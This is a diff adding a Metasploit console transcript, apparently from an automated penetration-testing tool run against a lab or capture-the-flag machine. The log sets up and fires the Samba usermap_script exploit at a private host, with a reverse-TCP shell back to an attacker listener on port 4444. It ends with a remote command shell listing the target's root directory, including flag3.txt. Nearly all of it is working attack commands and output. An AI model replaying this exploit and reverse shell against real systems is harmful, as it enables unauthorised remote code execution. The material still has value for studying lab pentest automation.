@@ -1,0 +1,61 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260709_093126.txt...
+resource (/tmp/tmpnpjiaytd.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmpnpjiaytd.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmpnpjiaytd.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmpnpjiaytd.rc)> setg CommandShellPty true
+[0mCommandShellPty => true
+resource (/tmp/tmpnpjiaytd.rc)> use exploit/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (/tmp/tmpnpjiaytd.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmpnpjiaytd.rc)> set RPORT 445
+[0mRPORT => 445
+resource (/tmp/tmpnpjiaytd.rc)> set payload generic/shell_reverse_tcp
+[0m[1m[31m[-][0m The value specified for payload is not valid.
+resource (/tmp/tmpnpjiaytd.rc)> set LHOST 192.168.139.129
+[0mLHOST => 192.168.139.129
+resource (/tmp/tmpnpjiaytd.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/tmpnpjiaytd.rc)> exploit -j -z
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+resource (/tmp/tmpnpjiaytd.rc)> sleep 5
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4444 
+resource (/tmp/tmpnpjiaytd.rc)> sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[1m[34m[*][0m Command shell session 1 opened (192.168.139.129:4444 -> 192.168.139.128:39788) at 2026-07-09 09:31:42 -0400
+bin
+boot
+cdrom
+dev
+etc
+flag3.txt
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+[1m[34m[*][0m 192.168.139.128 - Command shell session 1 closed.
+resource (/tmp/tmpnpjiaytd.rc)> shell
+[0m[1m[31m[-][0m Unknown command: shell. Run the [32mhelp[0m command for more details.
+resource (/tmp/tmpnpjiaytd.rc)> exit
+[0m
